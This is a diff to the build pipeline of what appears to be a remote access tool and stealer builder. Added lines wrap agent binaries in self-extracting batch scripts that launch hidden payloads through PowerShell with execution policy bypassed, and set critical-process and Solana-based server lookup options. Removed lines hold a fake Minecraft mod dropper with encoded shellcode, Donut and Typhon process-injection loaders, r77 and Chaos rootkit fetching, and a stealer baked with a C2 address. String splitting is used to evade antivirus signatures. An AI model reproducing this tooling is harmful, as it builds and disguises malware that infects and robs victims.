@@ -1294,7 +642,9 @@ func runBoundFiles() {
 
       if (env.CGO_ENABLED === "1") {
         const cCompilerByTarget: Record<string, string> = {
-          "linux/amd64": "gcc",
+          "linux/amd64": "musl-gcc",
+          "linux/arm64": "aarch64-linux-gnu-gcc",
+          "linux/arm/v7": "arm-linux-gnueabihf-gcc",
           "windows/amd64": "x86_64-w64-mingw32-gcc",
           "windows/386": "i686-w64-mingw32-gcc",
           ...(ndkBin ? {
@@ -1305,6 +655,8 @@ func runBoundFiles() {
         };
         const cxxCompilerByTarget: Record<string, string> = {
           "linux/amd64": "g++",
+          "linux/arm64": "aarch64-linux-gnu-g++",
+          "linux/arm/v7": "arm-linux-gnueabihf-g++",
           "windows/amd64": "x86_64-w64-mingw32-g++",
           "windows/386": "i686-w64-mingw32-g++",
           ...(ndkBin ? {
@@ -1348,6 +700,24 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
       }
 
+      if (config.solMemo) {
+        const solFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsSol=true";
+        ldflags = ldflags ? `${ldflags} ${solFlag}` : solFlag;
+        sendToStream({ type: "output", text: "Solana memo lookup: enabled\n", level: "info" });
+
+        if (config.solAddress) {
+          const solAddrFlag = `-X overlord-client/cmd/agent/config.DefaultSolAddress=${config.solAddress}`;
+          ldflags = `${ldflags} ${solAddrFlag}`;
+          sendToStream({ type: "output", text: `Solana address: ${config.solAddress}\n`, level: "info" });
+        }
+
+        if (config.solRpcEndpoints) {
+          const solRpcFlag = `-X overlord-client/cmd/agent/config.DefaultSolRPCEndpoints=${config.solRpcEndpoints}`;
+          ldflags = `${ldflags} ${solRpcFlag}`;
+          sendToStream({ type: "output", text: `Solana RPC endpoints: ${config.solRpcEndpoints}\n`, level: "info" });
+        }
+      }
+
       if (buildMutex) {
         const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
         ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
@@ -1361,7 +731,7 @@ func runBoundFiles() {
             ? config.persistenceMethods
             : ['startup'];
           sendToStream({ type: "output", text: `Persistence enabled for ${platform} (methods: ${activeMethods.join(', ')})\n`, level: "info" });
-          if (os === 'windows' && config.startupName) {
+          if (config.startupName) {
             const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
             ldflags = `${ldflags} ${startupNameFlag}`;
             sendToStream({ type: "output", text: `Startup name: ${config.startupName}\n`, level: "info" });
@@ -1393,6 +763,12 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
       }
 
+      if (config.criticalProcess && os === "windows") {
+        const criticalFlag = "-X overlord-client/cmd/agent/config.DefaultCriticalProcess=true";
+        ldflags = ldflags ? `${ldflags} ${criticalFlag}` : criticalFlag;
+        sendToStream({ type: "output", text: "Critical process: enabled (requires admin at runtime)\n", level: "info" });
+      }
+
       if (config.obfuscate) {
         sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
         if (config.garbleLiterals) {
@@ -1408,6 +784,14 @@ func runBoundFiles() {
 
       if (config.noPrinting) {
         sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
+      }
+
+      // Linux CGO builds must be fully statically linked to avoid glibc version
+      // mismatches between the build server and target machines.
+      if (os === "linux" && env.CGO_ENABLED === "1") {
+        const staticFlag = "-extldflags '-static'";
+        ldflags = ldflags ? `${ldflags} ${staticFlag}` : staticFlag;
+        sendToStream({ type: "output", text: "Linux CGO: static linking enabled (avoids GLIBC version mismatch)\n", level: "info" });
       }
 
       try {
@@ -1478,9 +862,8 @@ func runBoundFiles() {
         // For .bat/.cmd: go build writes a PE binary; UPX must run first (it needs PE format),
         // then after compression we wrap it in a batch script with an embedded base64 payload.
         const isBatWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
-        const isUpxEligible = filePath.endsWith(".exe") || filePath.endsWith(".dll");
 
-        if (upxBin && isUpxEligible) {
+        if (upxBin) {
           sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
           const originalSize = finalSize;
           try {
@@ -1506,104 +889,6 @@ func runBoundFiles() {
           } catch (upxErr: any) {
             sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
           }
-        } else if (upxBin && !isUpxEligible) {
-          sendToStream({ type: "output", text: `UPX skipped: ${outputName} is not a PE binary\n`, level: "info" });
-        }
-
-        // Donut shellcode conversion (Windows PE → position-independent shellcode)
-        // Runs after UPX so the compressed PE is used as input when both are enabled.
-        // Produces a separate .bin file and leaves the original PE untouched.
-        // shellcodePath is hoisted so the Typhon step can consume it.
-        let donutShellcodePath: string | null = null;
-        if (donutBin && os === "windows") {
-          const donutArchMap: Record<string, string> = {
-            amd64: "2",
-            "386": "1",
-          };
-          const donutArch = donutArchMap[actualArch];
-          if (donutArch) {
-            sendToStream({ type: "output", text: `Converting ${outputName} to shellcode with Donut...\n`, level: "info" });
-            const shellcodeName = deps.sanitizeOutputName(outputName.replace(/\.[^/.]+$/, "") + ".bin");
-            const shellcodePath = `${outDir}/${shellcodeName}`;
-            try {
-              const donutResult = await $`${donutBin} -i ${filePath} -o ${shellcodePath} -a ${donutArch}`.nothrow().quiet();
-              if (donutResult.exitCode !== 0) {
-                const errText = (donutResult.stderr.toString() || donutResult.stdout.toString()).trim();
-                sendToStream({ type: "output", text: `WARNING: Donut conversion failed (exit ${donutResult.exitCode}): ${errText}\n`, level: "warn" });
-              } else {
-                const shellcodeSize = Bun.file(shellcodePath).size;
-                if (shellcodeSize > 0) {
-                  sendToStream({ type: "output", text: `Donut shellcode: ${shellcodeSize} bytes → ${shellcodeName}\n`, level: "info" });
-                  donutShellcodePath = shellcodePath;
-                  (build.files as any[]).push({
-                    name: shellcodeName,
-                    filename: shellcodeName,
-                    platform,
-                    version: agentVersion,
-                    size: shellcodeSize,
-                  });
-                } else {
-                  sendToStream({ type: "output", text: `WARNING: Donut reported success but output file is empty/missing: ${shellcodeName}\n`, level: "warn" });
-                }
-              }
-            } catch (donutErr: any) {
-              sendToStream({ type: "output", text: `WARNING: Donut failed: ${donutErr.message || donutErr}\n`, level: "warn" });
-            }
-          } else {
-            sendToStream({ type: "output", text: `WARNING: Donut shellcode conversion skipped for ${platform} (ARM not supported by Donut)\n`, level: "warn" });
-          }
-        }
-
-        // Typhon process injection loader (wraps shellcode into a standalone evasive injector)
-        // Typhon supports x64 Windows only. Uses native typhon-builder (Linux Go binary).
-        if (typhonInfo && os === "windows" && actualArch === "amd64") {
-          const typhonInput = donutShellcodePath || filePath;
-          const typhonOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^/.]+$/, "") + "-typhon.exe");
-          const typhonOutputPath = `${outDir}/${typhonOutputName}`;
-          const typhonTemplate = path.join(ensureDataDir(), "tools", "typhon.exe");
-
-          sendToStream({ type: "output", text: `Building Typhon injector for ${platform}...\n`, level: "info" });
-
-          // typhon-builder flags: -i <input> -o <output> [-variant X] [-template path] [-donut path]
-          const typhonArgs: string[] = [
-            "-i", typhonInput,
-            "-o", typhonOutputPath,
-            "-template", typhonTemplate,
-          ];
-          if (config.typhonVariant) {
-            typhonArgs.push("-variant", config.typhonVariant);
-          }
-          if (donutBin) {
-            typhonArgs.push("-donut", donutBin);
-          }
-
-          try {
-            const typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
-
-            if (typhonResult.exitCode !== 0) {
-              const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
-              sendToStream({ type: "output", text: `WARNING: Typhon build failed (exit ${typhonResult.exitCode}): ${errText}\n`, level: "warn" });
-            } else {
-              const typhonSize = Bun.file(typhonOutputPath).size;
-              sendToStream({ type: "output", text: `Typhon injector: ${typhonSize} bytes → ${typhonOutputName}\n`, level: "info" });
-              (build.files as any[]).push({
-                name: typhonOutputName,
-                filename: typhonOutputName,
-                platform,
-                version: agentVersion,
-                size: typhonSize,
-              });
-            }
-          } catch (typhonErr: any) {
-            sendToStream({ type: "output", text: `WARNING: Typhon failed: ${typhonErr.message || typhonErr}\n`, level: "warn" });
-          }
-        } else if (typhonInfo && os === "windows" && actualArch !== "amd64") {
-          sendToStream({ type: "output", text: `WARNING: Typhon injection skipped for ${platform} (x64 only)\n`, level: "warn" });
-        }
-
-        // Track best shellcode/PE for JAR dropper (prefer Donut shellcode for windows-amd64)
-        if (os === "windows" && actualArch === "amd64" && !jarSourcePath) {
-          jarSourcePath = donutShellcodePath || filePath;
         }
 
         if (isBatWrapper) {
@@ -1611,70 +896,33 @@ func runBoundFiles() {
           try {
             const exeBytes = fs.readFileSync(filePath);
             const b64 = exeBytes.toString("base64");
-
-            // Random names for every temp artifact — different on every build
-            const vbsName = uuidv4().replace(/-/g, "").substring(0, 12) + ".vbs";
-            const ps1Name = uuidv4().replace(/-/g, "").substring(0, 12) + ".ps1";
-            const exeName = uuidv4().replace(/-/g, "").substring(0, 12) + ".exe";
-
-            // "powershell" as Chr() sequence — no literal in any generated file
-            const psChr = Array.from("powershell")
-              .map((c) => `Chr(${c.charCodeAt(0)})`)
-              .join("&");
-
-            // PS script: decode b64 chunks → write exe → run hidden → delete
-            // Sensitive method names split across string concat to break static sigs
-            const b64Chunks = b64.match(/.{1,6000}/g) || [b64];
-            const psLines: string[] = [
-              `$d=''`,
-              ...b64Chunks.map((c) => `$d+='${c}'`),
-              // Split method names to avoid static signatures
-              `$m1='From';$m2='Base64String'`,
-              `$b=[Convert]::($m1+$m2).Invoke($d)`,
-              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),'${exeName}')`,
-              `$w1='Write';$w2='AllBytes'`,
-              `[IO.File]::($w1+$w2).Invoke($t,$b)`,
-              `$p=New-Object Diagnostics.ProcessStartInfo($t)`,
-              `$p.WindowStyle='Hidden'`,
-              `[Diagnostics.Process]::Start($p)|Out-Null`,
-            ];
-
-            // VBS: write PS1 to temp, run "powershell" (via Chr concat) hidden, delete PS1
-            const vbsLines = [
-              `Dim fso,f,sh,tmp,p`,
-              `Set fso=CreateObject("Scripting.FileSystemObject")`,
-              `tmp=fso.GetSpecialFolder(2)&"\\${ps1Name}"`,
-              `Set f=fso.OpenTextFile(tmp,2,True)`,
-              ...psLines.map((l) => `f.WriteLine "${l.replace(/"/g, '""')}"`),
-              `f.Close`,
-              `Set sh=CreateObject("WScript.Shell")`,
-              `p=${psChr}`,
-              `sh.Run p&" -w h -ep b -nop -f """&tmp&"""",0,True`,
-              `fso.DeleteFile tmp`,
-            ];
-
-            // BAT escaping: special chars inside echo block need ^ prefix
-            const escEcho = (s: string) =>
-              s
-                .replace(/\^/g, "^^")
-                .replace(/&/g, "^&")
-                .replace(/\|/g, "^|")
-                .replace(/</g, "^<")
-                .replace(/>/g, "^>")
-                .replace(/%/g, "%%")
-                .replace(/\(/g, "^(")
-                .replace(/\)/g, "^)");
-
+            // Split into 76-char lines so the bat file stays manageable
+            const b64Lines = b64.match(/.{1,76}/g) || [b64];
+            // Random marker generated at build time using the same uuid util already imported
+            const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
+            // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
+            // decodes base64 to a temp .exe, launches it, then exits.
+            const psCmd = [
+              `$f=$env:_OVD_SELF;`,
+              `$l=[IO.File]::ReadAllLines($f);`,
+              `$i=0;`,
+              `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
+              `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
+              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
+              `[IO.File]::WriteAllBytes($t,$b);`,
+              `Start-Process $t;`,
+              `exit`,
+            ].join("");
             const wrapper = [
               `@echo off`,
-              `set "_v=%temp%\\${vbsName}"`,
-              `(`,
-              ...vbsLines.map((l) => `echo ${escEcho(l)}`),
-              `) > "%_v%"`,
-              `wscript /b "%_v%"`,
-              `del "%_v%" >nul 2>&1`,
+              `setlocal`,
+              `set "_OVD_SELF=%~f0"`,
+              `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
+              `endlocal`,
+              `exit /b 0`,
+              marker,
+              ...b64Lines,
             ].join("\r\n") + "\r\n";
-
             fs.writeFileSync(filePath, wrapper, "utf8");
             finalSize = fs.statSync(filePath).size;
             sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
@@ -1683,16 +931,13 @@ func runBoundFiles() {
           }
         }
 
-        // When .bin or .jar is the output type, the intermediate PE is not the deliverable
-        if (!outputExtIsBin && !outputExtIsJar) {
-          (build.files as any[]).push({
-            name: outputName,
-            filename: outputName,
-            platform,
-            version: agentVersion,
-            size: finalSize,
-          });
-        }
+        (build.files as any[]).push({
+          name: outputName,
+          filename: outputName,
+          platform,
+          version: agentVersion,
+          size: finalSize,
+        });
       } catch (err: any) {
         const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
         logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
@@ -1701,403 +946,9 @@ func runBoundFiles() {
       }
     }
 
-    // ── Minecraft JAR dropper ────────────────────────────────────────────────
-    if (config.enableJar || config.outputExtension === ".jar") {
-      sendToStream({ type: "status", text: "Building Minecraft JAR dropper..." });
-      sendToStream({ type: "output", text: "\n=== Minecraft JAR Dropper ===\n", level: "info" });
-      const javaTools = await checkJavaAvailable(sendToStream);
-      if (!javaTools) {
-        sendToStream({ type: "output", text: "WARNING: javac/jar not found — skipping JAR dropper (install JDK)\n", level: "warn" });
-      } else if (!jarSourcePath) {
-        sendToStream({ type: "output", text: "WARNING: No Windows x64 payload available for JAR dropper — include a windows-amd64 target\n", level: "warn" });
-      } else {
-        const mcVer = (config.jarMcVersion || "1.20.1").replace(/[^0-9.]/g, "").slice(0, 16);
-        const modId = (config.jarModId || "mcmod").replace(/[^a-z0-9_]/g, "_").slice(0, 32);
-        const modName = (config.jarModName || "Minecraft Mod").slice(0, 64);
-        const jarTmpDir = path.join(outDir, `.jar-build-${buildId.substring(0, 8)}`);
-        try {
-          const srcPkg = path.join(jarTmpDir, "src", "com", "mc", "mod");
-          fs.mkdirSync(srcPkg, { recursive: true });
-          fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource());
-
-          // Stub ModInitializer so javac can properly resolve the interface reference.
-          // The stub class is deleted before packaging — Fabric provides the real one at runtime.
-          const fabricApiSrcDir = path.join(jarTmpDir, "src", "net", "fabricmc", "api");
-          fs.mkdirSync(fabricApiSrcDir, { recursive: true });
-          fs.writeFileSync(path.join(fabricApiSrcDir, "ModInitializer.java"),
-            "package net.fabricmc.api;\npublic interface ModInitializer { void onInitialize(); }\n");
-
-          // Write dummy classes to pad class count and appear as a real mod
-          const dummyClasses = generateDummyClasses(modId);
-          const dummySrcPaths: string[] = [];
-          for (const [relPath, src] of Object.entries(dummyClasses)) {
-            const fullPath = path.join(jarTmpDir, "src", relPath);
-            fs.mkdirSync(path.dirname(fullPath), { recursive: true });
-            fs.writeFileSync(fullPath, src);
-            dummySrcPaths.push(fullPath);
-          }
-
-          const classDir = path.join(jarTmpDir, "classes");
-          fs.mkdirSync(classDir, { recursive: true });
-
-          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiSrcDir, "ModInitializer.java")} ${dummySrcPaths}`.nothrow().quiet();
-          if (compileResult.exitCode !== 0) {
-            const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
-            sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
-          } else {
-            // Remove the stub Fabric API classes — Fabric provides the real ones at runtime
-            try { fs.rmSync(path.join(classDir, "net"), { recursive: true, force: true }); } catch {}
-
-            // ADD-encrypt shellcode and store as innocuous resource name
-            const rawSc = fs.readFileSync(jarSourcePath);
-            const xorKey = (Math.floor(Math.random() * 254) + 1) & 0xff;
-            const xored = Buffer.from(rawSc.map((b: number) => (b + xorKey) & 0xff));
-            const packed = Buffer.concat([Buffer.from([xorKey]), xored]);
-            const pakDir = path.join(classDir, "assets");
-            fs.mkdirSync(pakDir, { recursive: true });
-            fs.writeFileSync(path.join(pakDir, "data.pak"), packed);
-
-            // Embed bound mods as nested JARs (Fabric nested-JAR spec)
-            const nestedJarNames: string[] = [];
-            const boundMods = config.jarBoundMods || [];
-            if (boundMods.length > 0) {
-              const nestedJarDir = path.join(classDir, "META-INF", "jars");
-              fs.mkdirSync(nestedJarDir, { recursive: true });
-              for (const bm of boundMods) {
-                try {
-                  const jarBytes = Buffer.from(bm.data, "base64");
-                  const safeName = bm.name.replace(/[^A-Za-z0-9._-]/g, "_").replace(/(?<!\.jar)$/, "");
-                  fs.writeFileSync(path.join(nestedJarDir, safeName), jarBytes);
-                  nestedJarNames.push(safeName);
-                  sendToStream({ type: "output", text: `Bundled mod: ${safeName} (${jarBytes.length} bytes)\n`, level: "info" });
-                } catch (bmErr: any) {
-                  sendToStream({ type: "output", text: `WARNING: Failed to embed bound mod ${bm.name}: ${bmErr.message}\n`, level: "warn" });
-                }
-              }
-            }
-
-            // Generate MC metadata files
-            const metaFiles = generateMcMetadata(mcVer, modId, modName, nestedJarNames);
-            for (const [fname, fcontent] of Object.entries(metaFiles)) {
-              const metaPath = path.join(classDir, fname);
-              fs.mkdirSync(path.dirname(metaPath), { recursive: true });
-              fs.writeFileSync(metaPath, fcontent);
-            }
-
-            // MANIFEST.MF
-            const manifestDir = path.join(classDir, "META-INF");
-            fs.mkdirSync(manifestDir, { recursive: true });
-            fs.writeFileSync(path.join(manifestDir, "MANIFEST.MF"), "Manifest-Version: 1.0\nMain-Class: com.mc.mod.ModLoader\n");
-
-            const jarName = deps.sanitizeOutputName(`${modId}-${mcVer}.jar`);
-            const jarPath = path.join(outDir, jarName);
-            const jarResult = await $`${javaTools.jar} cf ${jarPath} -C ${classDir} .`.nothrow().quiet();
-            if (jarResult.exitCode !== 0) {
-              const err = (jarResult.stderr.toString() || jarResult.stdout.toString()).trim();
-              sendToStream({ type: "output", text: `WARNING: jar packaging failed: ${err}\n`, level: "warn" });
-            } else {
-              const jarSize = Bun.file(jarPath).size;
-              sendToStream({ type: "output", text: `JAR dropper built: ${jarName} (${jarSize} bytes, MC ${mcVer})\n`, level: "info" });
-              (build.files as any[]).push({ name: jarName, filename: jarName, platform: "java", version: agentVersion, size: jarSize });
-            }
-          }
-        } catch (jarErr: any) {
-          sendToStream({ type: "output", text: `WARNING: JAR build error: ${jarErr.message || jarErr}\n`, level: "warn" });
-        } finally {
-          try { fs.rmSync(jarTmpDir, { recursive: true, force: true }); } catch {}
-        }
-      }
-    }
-
-    // ── r77 Rootkit (Ring 3 fileless rootkit) ────────────────────────────────
-    if (config.enableR77) {
-      sendToStream({ type: "status", text: "Fetching r77 rootkit assets..." });
-      sendToStream({ type: "output", text: "\n=== r77 Rootkit (Ring 3) ===\n", level: "info" });
-      sendToStream({ type: "output", text: "r77 is a fileless ring-3 rootkit — hooks Windows APIs to hide files, processes, registry keys\n", level: "info" });
-      const rootkitCacheDir = path.join(ensureDataDir(), "tools", "rootkit-cache", "r77");
-      const r77Assets = await fetchGithubReleaseAssets(
-        "bytecode77", "r77-rootkit",
-        ["Install.exe", "Uninstall.exe", "Install.shellcode"],
-        rootkitCacheDir, sendToStream,
-      );
-      for (const [assetName, localPath] of Object.entries(r77Assets)) {
-        const size = fs.statSync(localPath).size;
-        const outputName = deps.sanitizeOutputName(`r77-${assetName}`);
-        const destPath = path.join(outDir, outputName);
-        fs.copyFileSync(localPath, destPath);
-        sendToStream({ type: "output", text: `r77: ${outputName} (${size} bytes)\n`, level: "info" });
-        (build.files as any[]).push({ name: outputName, filename: outputName, platform: "windows", version: "r77", size });
-      }
-      if (Object.keys(r77Assets).length === 0) {
-        sendToStream({ type: "output", text: "WARNING: No r77 assets could be fetched\n", level: "warn" });
-      }
-    }
-
-    // ── Chaos Rootkit (Ring 0 kernel driver + Ring 3 controller) ─────────────
-    if (config.enableChaos) {
-      sendToStream({ type: "status", text: "Fetching Chaos rootkit assets..." });
-      sendToStream({ type: "output", text: "\n=== Chaos Rootkit (Ring 0 + Ring 3) ===\n", level: "info" });
-      sendToStream({ type: "output", text: "Chaos: kernel driver (DKOM process hiding, privilege escalation) + ring-3 controller\n", level: "info" });
-      const chaosMode = config.chaosMode || "both";
-      const chaosAssetNames: string[] = [];
-      if (chaosMode === "ring0" || chaosMode === "both") chaosAssetNames.push("Chaos-Rootkit.sys");
-      if (chaosMode === "ring3" || chaosMode === "both") chaosAssetNames.push("ring3-console.exe", "ring3-gui.exe");
-      const rootkitCacheDir = path.join(ensureDataDir(), "tools", "rootkit-cache", "chaos");
-      const chaosAssets = await fetchGithubReleaseAssets(
-        "ZeroMemoryEx", "Chaos-Rootkit",
-        chaosAssetNames,
-        rootkitCacheDir, sendToStream,
-      );
-      for (const [assetName, localPath] of Object.entries(chaosAssets)) {
-        const size = fs.statSync(localPath).size;
-        const outputName = deps.sanitizeOutputName(`chaos-${assetName}`);
-        const destPath = path.join(outDir, outputName);
-        fs.copyFileSync(localPath, destPath);
-        const ring = assetName.endsWith(".sys") ? "ring0 kernel driver" : "ring3 controller";
-        sendToStream({ type: "output", text: `Chaos (${ring}): ${outputName} (${size} bytes)\n`, level: "info" });
-        (build.files as any[]).push({ name: outputName, filename: outputName, platform: "windows", version: "chaos", size });
-      }
-      if (Object.keys(chaosAssets).length === 0) {
-        sendToStream({ type: "output", text: "WARNING: No Chaos assets could be fetched\n", level: "warn" });
-      }
-    }
-
-    // ── Standalone Stealer Binary ────────────────────────────────────────────
-    if (config.enableStealer && config.serverUrl && buildAgentToken) {
-      sendToStream({ type: "status", text: "Building standalone stealer binary..." });
-      sendToStream({ type: "output", text: "\n=== Standalone Stealer Binary ===\n", level: "info" });
-      sendToStream({ type: "output", text: `C2 URL: ${config.serverUrl}\n`, level: "info" });
-
-      // Resolve Donut/Typhon for stealer if not already resolved by the main build
-      let stealerDonutBin = donutBin;
-      let stealerTyphonInfo = typhonInfo;
-      if (!stealerDonutBin) {
-        const d = await checkDonutAvailable(sendToStream);
-        if (d) {
-          stealerDonutBin = d;
-        } else {
-          sendToStream({ type: "output", text: "Donut not available — shellcode conversion skipped for stealer\n", level: "warn" });
-        }
-      }
-      if (!stealerTyphonInfo) {
-        const t = await checkTyphonAvailable(sendToStream);
-        if (t) {
-          stealerTyphonInfo = t;
-        } else {
-          sendToStream({ type: "output", text: "Typhon not available — process hollowing skipped for stealer\n", level: "warn" });
-        }
-      }
-
-      const stealerEnv: NodeJS.ProcessEnv = {
-        ...process.env,
-        GOOS: "windows",
-        GOARCH: "amd64",
-        GOAMD64: "v1",
-        CGO_ENABLED: "0",
-        GOWORK: "off",
-        GOCACHE: goBuildCacheDir,
-        GOMODCACHE: goModCacheDir,
-        CC: "x86_64-w64-mingw32-gcc",
-      };
-
-      const stealerLdflags = [
-        `-X overlord-client/cmd/stealer/main.DefaultC2URL=${config.serverUrl}`,
-        `-X overlord-client/cmd/stealer/main.DefaultAgentToken=${buildAgentToken}`,
-        "-s -w",
-        "-H=windowsgui",
-      ].join(" ");
-
-      const stealerPeName = deps.sanitizeOutputName("stealer-windows-amd64.exe");
-      const stealerPePath = `${outDir}/${stealerPeName}`;
-
-      const stealerBuildArgs = [
-        "-trimpath",
-        "-buildvcs=false",
-        `-ldflags=${stealerLdflags}`,
-        "-o", stealerPePath,
-        "./cmd/stealer",
-      ];
-
-      // Use garble if obfuscation is enabled — same flags as the main agent build
-      let stealerBuildCmd;
-      if (config.obfuscate) {
-        sendToStream({ type: "output", text: "Obfuscation enabled for stealer (garble)\n", level: "info" });
-        const garbleFlags: string[] = [];
-        if (config.garbleLiterals) { garbleFlags.push("-literals"); sendToStream({ type: "output", text: "Garble: obfuscate literals\n", level: "info" }); }
-        if (config.garbleTiny)     { garbleFlags.push("-tiny");     sendToStream({ type: "output", text: "Garble: tiny mode\n",           level: "info" }); }
-        if (config.garbleSeed)     { garbleFlags.push(`-seed=${config.garbleSeed}`); }
-        stealerBuildCmd = $`garble ${garbleFlags} build ${stealerBuildArgs}`;
-      } else {
-        stealerBuildCmd = $`go build ${stealerBuildArgs}`;
-      }
-
-      logger.info(`[build:${buildId.substring(0, 8)}] Building stealer: ${config.obfuscate ? "garble" : "go"} build ${stealerBuildArgs.join(" ")}`);
-
-      const stealerProc = stealerBuildCmd.env(stealerEnv).cwd(clientDir).nothrow();
-      for await (const line of stealerProc.lines()) {
-        const t = line.trim();
-        if (t) sendToStream({ type: "output", text: line + "\n", level: "info" });
-      }
-      const stealerResult = await stealerProc;
-
-      if (stealerResult.exitCode !== 0) {
-        const errText = stealerResult.stderr.toString().trim();
-        if (errText) sendToStream({ type: "output", text: errText + "\n", level: "error" });
-        sendToStream({ type: "output", text: "WARNING: Stealer binary build failed — skipping\n", level: "warn" });
-      } else {
-        const stealerPeSize = Bun.file(stealerPePath).size;
-        sendToStream({ type: "output", text: `Stealer PE: ${stealerPeName} (${stealerPeSize} bytes)\n`, level: "info" });
-        (build.files as any[]).push({
-          name: stealerPeName,
-          filename: stealerPeName,
-          platform: "windows-amd64",
-          version: "stealer",
-          size: stealerPeSize,
-        });
-
-        // ── Donut: convert PE → position-independent shellcode ──────────────
-        let stealerShellcodePath: string | null = null;
-        if (stealerDonutBin) {
-          const stealerBinName = deps.sanitizeOutputName("stealer-windows-amd64.bin");
-          const stealerBinPath = `${outDir}/${stealerBinName}`;
-          sendToStream({ type: "output", text: `Converting stealer PE to shellcode with Donut...\n`, level: "info" });
-          try {
-            const donutResult = await $`${stealerDonutBin} -i ${stealerPePath} -o ${stealerBinPath} -a 2`.nothrow().quiet();
-            if (donutResult.exitCode !== 0) {
-              const errText = (donutResult.stderr.toString() || donutResult.stdout.toString()).trim();
-              sendToStream({ type: "output", text: `WARNING: Donut failed for stealer (exit ${donutResult.exitCode}): ${errText}\n`, level: "warn" });
-            } else {
-              const shellcodeSize = Bun.file(stealerBinPath).size;
-              if (shellcodeSize > 0) {
-                sendToStream({ type: "output", text: `Stealer shellcode: ${stealerBinName} (${shellcodeSize} bytes)\n`, level: "info" });
-                stealerShellcodePath = stealerBinPath;
-                (build.files as any[]).push({
-                  name: stealerBinName,
-                  filename: stealerBinName,
-                  platform: "windows-amd64",
-                  version: "stealer",
-                  size: shellcodeSize,
-                });
-              } else {
-                sendToStream({ type: "output", text: `WARNING: Donut shellcode output for stealer is empty\n`, level: "warn" });
-              }
-            }
-          } catch (donutErr: any) {
-            sendToStream({ type: "output", text: `WARNING: Donut error for stealer: ${donutErr.message || donutErr}\n`, level: "warn" });
-          }
-        }
-
-        // ── Typhon: wrap shellcode (or PE) in a process-hollowing loader ────
-        if (stealerTyphonInfo) {
-          const typhonInput = stealerShellcodePath || stealerPePath;
-          const stealerTyphonName = deps.sanitizeOutputName("stealer-windows-amd64-typhon.exe");
-          const stealerTyphonPath = `${outDir}/${stealerTyphonName}`;
-          sendToStream({ type: "output", text: `Wrapping stealer in Typhon process-hollowing loader...\n`, level: "info" });
-
-          const typhonTemplate = path.join(ensureDataDir(), "tools", "typhon.exe");
-          const typhonArgs: string[] = [
-            "-i", typhonInput,
-            "-o", stealerTyphonPath,
-            "-template", typhonTemplate,
-          ];
-          if (config.typhonVariant) typhonArgs.push("-variant", config.typhonVariant);
-          if (stealerDonutBin) typhonArgs.push("-donut", stealerDonutBin);
-
-          try {
-            const typhonResult = await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
-
-            if (typhonResult.exitCode !== 0) {
-              const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
-              sendToStream({ type: "output", text: `WARNING: Typhon failed for stealer (exit ${typhonResult.exitCode}): ${errText}\n`, level: "warn" });
-            } else {
-              const typhonSize = Bun.file(stealerTyphonPath).size;
-              sendToStream({ type: "output", text: `Stealer Typhon loader: ${stealerTyphonName} (${typhonSize} bytes)\n`, level: "info" });
-              (build.files as any[]).push({
-                name: stealerTyphonName,
-                filename: stealerTyphonName,
-                platform: "windows-amd64",
-                version: "stealer",
-                size: typhonSize,
-              });
-            }
-          } catch (typhonErr: any) {
-            sendToStream({ type: "output", text: `WARNING: Typhon error for stealer: ${typhonErr.message || typhonErr}\n`, level: "warn" });
-          }
-        }
-      }
-    } else if (config.enableStealer) {
-      sendToStream({ type: "output", text: "WARNING: Stealer binary requires a server URL and agent token — skipping\n", level: "warn" });
-    }
-
-    // Vault post-quantum encryption — runs after all platform builds so every output
-    // (PE, shellcode, Typhon injector) is encrypted before being offered for download.
-    if (vaultBin) {
-      sendToStream({ type: "status", text: "Encrypting build outputs with Vault..." });
-      sendToStream({ type: "output", text: "\n=== Vault Post-Quantum Encryption ===\n", level: "info" });
-
-      let recipientKey = config.vaultRecipient?.trim() || null;
-      if (!recipientKey) {
-        recipientKey = await ensureVaultKeypair(vaultBin, sendToStream);
-      } else {
-        sendToStream({ type: "output", text: "Using provided Vault recipient key\n", level: "info" });
-      }
-
-      if (recipientKey) {
-        const filesToEncrypt = [...(build.files as any[])];
-        for (const file of filesToEncrypt) {
-          const inputPath = path.join(outDir, file.filename);
-          const vaultName = deps.sanitizeOutputName(file.filename + ".vault");
-          const vaultPath = path.join(outDir, vaultName);
-          try {
-            const encResult = await $`${vaultBin} encrypt -i ${inputPath} -o ${vaultPath} -r ${recipientKey}`.nothrow().quiet();
